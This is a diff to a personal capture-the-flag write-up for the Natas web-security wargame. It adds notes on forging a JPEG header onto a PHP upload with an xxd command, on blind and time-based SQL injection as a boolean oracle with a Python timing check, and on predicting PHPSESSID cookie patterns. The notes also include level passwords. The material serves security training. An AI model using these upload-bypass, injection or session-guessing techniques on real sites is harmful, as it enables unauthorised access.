@@ -139,6 +139,8 @@ The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
 
 # natas 12
 
+a very simple Local File inclusion, no check on file format when upload, allowing us to upload a malicious PHP code. 
+
 ```html
 <input type="hidden" name="filename" value="some.php">
 ```
@@ -166,7 +168,11 @@ its checking the file signature or the magic byte by  `exif_imagetype()`
 
 can be easily overwritten with xxd.
 
-`{ xxd -r -p <(echo "ffd8ffe000104a46494600010101"); cat upload.php; } > upload-with-img-hdr.php`
+the file signature for a JPEG file is `ffd8ffe000104a46494600010101`
+
+```bash
+{ xxd -r -p <(echo "ffd8ffe000104a46494600010101"); cat upload.php; } > upload-with-img-hdr.php
+```
 
 with this we have a php file that has a signature of a JPEG file.
 
@@ -207,6 +213,8 @@ Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
 a bit more advanced SQL Injection
 
 a blind SQL injection using `LIKE BINARY %a` SQL  method to determine the starting sequence of a password 
+
+its called a Boolean Oracle. because it can help us achieve a boolean case on the password and guess it character by character.
 
 POST req data:
 
@@ -328,7 +336,7 @@ apparently you can use SQL SLEEP command (MySQL here). so if we chain the condit
 
 we can differentiate the responses with Time, here. so in my case the average HTTP Request takes about dt= 0.134s time.
 with a 1 second sleep we can know the True statements from fasle here. editing the same python code from natas15.
-adding a time checker:
+ adding a time difference checker:
 ```py
     t0 = time.perf_counter()
     resp = session.post(URL, data={"username": payload}, timeout=10)
@@ -370,4 +378,36 @@ DEBUG: Session start ok<br>You are an admin. The credentials for the next level 
 Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
 ```
 
-</details>
+</details><br/>
+
+
+# natas 19
+
+seems like the same level as before but session IDs are no longer sequential. also not integers anymore. but after loging in many times you notice a pattern in the PHPSESSID cookie, it always ends with 2d61646d696e. 
+
+but the starting sequence is the dynamic part, its values like 353933, 313236, 343136, which are 6 digits, but sometimes they are 4 digits like 3539 and 3435, sometimes even 2 , like 34. so we can even conlcude the cookie almost all the time starts with the number 3 (i looped 100 times). 
+
+not only that, if we take a closer look, the third digit is also always 3!
+
+```
+{'PHPSESSID': '3   43339      2d61646d696e'}
+{'PHPSESSID': '3   53933      2d61646d696e'}
+{'PHPSESSID': '3   13236      2d61646d696e'}
+{'PHPSESSID': '3   63136      2d61646d696e'}
+{'PHPSESSID': '3   23831      2d61646d696e'}
+{'PHPSESSID': '3   43136      2d61646d696e'}
+{'PHPSESSID': '3   23436      2d61646d696e'}
+{'PHPSESSID': '3   33635      2d61646d696e'}
+{'PHPSESSID': '3   53234      2d61646d696e'}
+{'PHPSESSID': '3   53536      2d61646d696e'}
+{'PHPSESSID': '3   63135      2d61646d696e'}
+{'PHPSESSID': '3   23937      2d61646d696e'}
+{'PHPSESSID': '3   53635      2d61646d696e'}
+{'PHPSESSID': '3   432      2d61646d696e'}
+{'PHPSESSID': '3   4      2d61646d696e'}
+```
+
+so is the 5th! with this we have a much easier time predicting the correct combination, there are some random anamolies though, like the last one. which is only one number, and the previous, which doesnt have a 5th digit. maybe we can ignore those. or we should write cases for each digit length
+
+
+so far the cases are, 1 digit, 3 digits and 5 digits between the starting '3' and the end sequence 2d61646d696e
